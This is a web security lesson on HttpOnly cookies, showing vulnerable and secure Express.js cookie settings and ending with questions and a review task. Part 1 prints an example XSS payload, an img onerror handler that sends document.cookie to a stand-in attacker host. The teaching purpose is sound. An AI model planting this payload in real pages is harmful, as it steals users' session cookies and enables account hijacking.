💡 AA01-1.2: The Power of HttpOnly Cookies

**Outline:**

- **The Threat (SEEI):** Understanding that not all cookies are created equal; standard cookies are still vulnerable.
- **The Defense (PPP):** Learning how the `HttpOnly` flag creates a browser-enforced barrier against script access.
- **Your Mission (Production):** Time to dissect a `Set-Cookie` header like a security pro.

### 📘 Full Lesson Content

### **Part 1: Presentation - The Threat (SEEI)**

- **What is it? (The Vulnerability):** Just moving your JWT to a cookie isn't a complete fix. By default, cookies can also be accessed by client-side JavaScript via the `document.cookie` property. This means if you set a standard cookie, an XSS payload can still read it and send it to an attacker's server. You've simply moved the key from under the doormat to inside a flimsy shoebox on the porch.
    
- **How it Works (The Attack Vector):** An attacker injects a script, just like in the previous lesson. But this time, the script targets `document.cookie`.
    
    ```ts
    // VULNERABLE SERVER CONFIGURATION (Express.js)
    // Note the absence of the httpOnly flag.
    res.cookie('jwt', token, {
      secure: true, // Requires HTTPS
      sameSite: 'strict'
    });
    
    // MALICIOUS SCRIPT INJECTED ON THE FRONTEND
    // <img src=1 onerror="fetch('<https://attacker.com/steal?cookie=>' + document.cookie)" />
    
    ```
    
    When this script runs, the browser happily provides the full cookie string (e.g., `"jwt=ey...; other_cookie=value"`), which is then sent off to the attacker. The session is, once again, hijacked. The core problem remains: client-side scripts have access to a sensitive credential.
    

### **Part 2: Practice - The Defense (PPP)**

- **The Golden Rule:** **Isolate secrets from the execution environment.** The `HttpOnly` flag is the critical security attribute for cookies that contain sensitive information. It's a directive to the browser, telling it: "This cookie is for HTTP/S requests only. Never, under any circumstances, allow client-side scripts to access it."
    
- **Secure Code Implementation:** The defense is implemented entirely on the server when the cookie is set. The frontend code doesn't change at all.
    
    ```ts
    // SECURE SERVER CONFIGURATION (Express.js)
    res.cookie('access_token', token, {
      httpOnly: true, // <-- THE MAGIC FLAG
      secure: true, // Essential: only send over HTTPS
      sameSite: 'strict', // Strongest CSRF protection
      maxAge: 900000 // e.g., 15 minutes in milliseconds
    });
    
    ```
    
    Now, if an XSS script tries to run `console.log(document.cookie)`, the `access_token` cookie will simply not appear in the output. The browser enforces this rule at a level below your application code.
    

### 🧠 Real-World Case Study: "The Secret Note vs. The Sealed Envelope"

- **The Goal:** Pass a secret session token from the server to the browser for future API calls.
- **Vulnerable Approach (Standard Cookie):** Setting a cookie without `HttpOnly` is like the server handing the browser a secret note written on a postcard. The mailman (browser) knows to deliver it, but anyone along the way (any script on the page) can read the message.
- **Secure Approach (HttpOnly Cookie):** Setting an `HttpOnly` cookie is like the server placing the secret note inside a security envelope with a wax seal that says "DO NOT OPEN. FOR MAILMAN'S EYES ONLY." The mailman (browser) can see who it's for and where it's going, and will present it at the destination (the API server), but it is forbidden from opening the envelope and revealing the contents to anyone else (client-side scripts).

### 🤔 Reflective Questions

1. If `HttpOnly` prevents JavaScript from reading the token, how does your React app know if a user is logged in or not? What challenges does this introduce for the UI? (This is a lead-in to the next lesson).
2. What is the purpose of the `Secure` flag? What happens if you set `secure: true` but are developing on `http://localhost`?
3. What is the difference between `SameSite=Strict` and `SameSite=Lax`? Which one provides stronger protection against Cross-Site Request Forgery (CSRF) attacks?

### 📚 Further Reading

- **OWASP:** [HttpOnly Flag](https://owasp.org/www-community/HttpOnly)
- **MDN Web Docs:** [Set-Cookie Header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie) (Pay close attention to the directives: `HttpOnly`, `Secure`, `SameSite`).
- **Google Web Fundamentals:** [SameSite cookies explained](https://web.dev/samesite-cookies-explained/)

### 📝 Mini-Task (Production)

You are inspecting the network traffic of your web application and see the following response header coming from your API server after a successful login.

`Set-Cookie: session_id=abc123xyz; Path=/; Secure; Max-Age=3600`

Your task: Write a security review comment for the backend developer. Identify the critical missing security attribute on this cookie and explain the risk it poses. Then, rewrite the `Set-Cookie` header to be secure.